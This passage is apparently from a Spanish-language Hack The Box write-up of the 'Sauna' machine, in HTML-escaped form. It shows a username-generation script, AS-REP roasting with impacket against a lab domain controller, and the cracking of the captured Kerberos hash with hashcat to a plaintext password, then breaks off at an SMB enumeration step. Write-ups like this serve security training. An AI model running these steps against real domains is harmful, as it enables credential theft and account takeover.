		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;usage: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; names.txt&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]):&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isalpha&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()])&lt;/span&gt;

		&lt;span class=&#34;n&#34;&gt;tokens&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tokens&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;lname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tokens&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;

		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lname&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;# johndoe&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;# doejohn&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lname&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;# john.doe&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;# doe.john&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;# doej&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lname&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;# jdoe&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;# djoe&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lname&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;# j.doe&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;# d.john&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fname&lt;/span&gt;			&lt;span class=&#34;c1&#34;&gt;# john&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos GetNPUsers de impacket para obtener informacion de LDAP junto con la lista de usuarios sin autenticacion:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/sauna# python /root/tools/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile list_users.txt -request -format hashcat -outputfile hashes.asreproast
Impacket v0.9.20 - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Client not found in Kerberos database&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Client not found in Kerberos database&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User hsmith doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Client not found in Kerberos database&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Client not found in Kerberos database&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$krb5asrep$23$fsmith&lt;/span&gt;@EGOTISTICAL-BANK.LOCAL:42fc70db3f5d9b26862ee8a381f41300&lt;span class=&#34;nv&#34;&gt;$bfc70df530d642039f9c1135e399e4cf27e8ddb75f8a2dbc9b37b4b66226b9d733452368075ea1bfee410a0e18430b2320407c02aa161cd9be0ed96285ced026eb233fbfa2e9b65991321c6d9c4bf9556f32759eb9fe92f239b91543a2f96e643e2f30fe3c8b59c83e39104a3134c165feec05d2d993962a716e495b9c629a63d9e35355337d280ec389ef730495aead980f9a5a9654c9f356553ca484c2014a411a2e812906a6a1ba7e133456cf0bf532d2d682d451e8577f35c6059474e6829e5d0e3bfed887828cbe7efb36d946e13ed6a2aa67ca2819e587d68386244d055998571d4a5a5831935e47dfdac4caf73072c6592af0ad0226e94e3657b71e40&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Client not found in Kerberos database&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Client not found in Kerberos database&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

root@aoiri:~/htb/sauna#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Hashes capturadas&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9fd61a55cd08ff4f2298bf6d2eaea41$9b8899d4f678c22f5171bb699d87d51a08520d8206cc6967017f65bee3fb3d814855da6929a1691b6fb3d430cf0ee2697022ecce332fd29d3af31fce8766b67d90ead50310c7238dd9a6a48478fc0d25c1c0a8e8cea418795d36d56b8c6c2069f0aad851172a4dedeb7c5898a44e36401383718caaaaab04a670d4dbd6ef42f84bf097f4e180cb9cc9b00b497e6a758aa5084aa46d9f365d6f5896eea79954e553510369d1bfaeed9a1f4ce63125aeddcc1a533c16e19047a211457455470338e12d2e970a234a98203e9808c67a2b97356f4d89d8da0d115c91fd5a294b7daf2c69321b4ac2d6dfa38f470fd1f9854148342442ca44437c1c099c39db5fdd5a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Utilizamos hashcat para crackear la contraseña:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  hashcat ./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;18200&lt;/span&gt; sauna_hash ../rockyou.txt -o sauna_cracked.txt 
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#1: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates
Rules: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache hit:
* Filename..: ../rockyou.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;139921507&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;tatus &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;p&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ause &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ypass &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;heckpoint &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;q&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 
                                               
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; AS-REP etype &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;
Hash.Target......: &lt;span class=&#34;nv&#34;&gt;$krb5asrep$23$fsmith&lt;/span&gt;@EGOTISTICAL-BANK.LOCAL:a9fd61a...5fdd5a
Time.Started.....: Wed Feb &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 15:45:34 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Wed Feb &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 15:45:40 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;../rockyou.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........:  2115.6 kH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9.59ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:256 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 10567680/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;73.67%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/10567680 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 10518528/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;73.33%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: VALERIA05 -&amp;gt; TGWild&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;
Hardware.Mon.#1..: Temp: 57c Util: 37% Core:1189MHz Mem:2505MHz Bus:4

Started: Wed Feb &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 15:45:26 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Stopped: Wed Feb &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 15:45:41 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
➜  hashcat cat sauna_cracked.txt 
&lt;span class=&#34;nv&#34;&gt;$krb5asrep$23$fsmith&lt;/span&gt;@EGOTISTICAL-BANK.LOCAL:a9fd61a55cd08ff4f2298bf6d2eaea41&lt;span class=&#34;nv&#34;&gt;$9&lt;/span&gt;b8899d4f678c22f5171bb699d87d51a08520d8206cc6967017f65bee3fb3d814855da6929a1691b6fb3d430cf0ee2697022ecce332fd29d3af31fce8766b67d90ead50310c7238dd9a6a48478fc0d25c1c0a8e8cea418795d36d56b8c6c2069f0aad851172a4dedeb7c5898a44e36401383718caaaaab04a670d4dbd6ef42f84bf097f4e180cb9cc9b00b497e6a758aa5084aa46d9f365d6f5896eea79954e553510369d1bfaeed9a1f4ce63125aeddcc1a533c16e19047a211457455470338e12d2e970a234a98203e9808c67a2b97356f4d89d8da0d115c91fd5a294b7daf2c69321b4ac2d6dfa38f470fd1f9854148342442ca44437c1c099c39db5fdd5a:Thestrokes23
➜  hashcat
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smbmap&#34;&gt;SMBMAP&lt;/h2&gt;
&lt;p&gt;Utilizamos smbmap con las credenciales que encontramos para enumerar los SHARENAMES a los que el usuario fsmith puede acceder.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
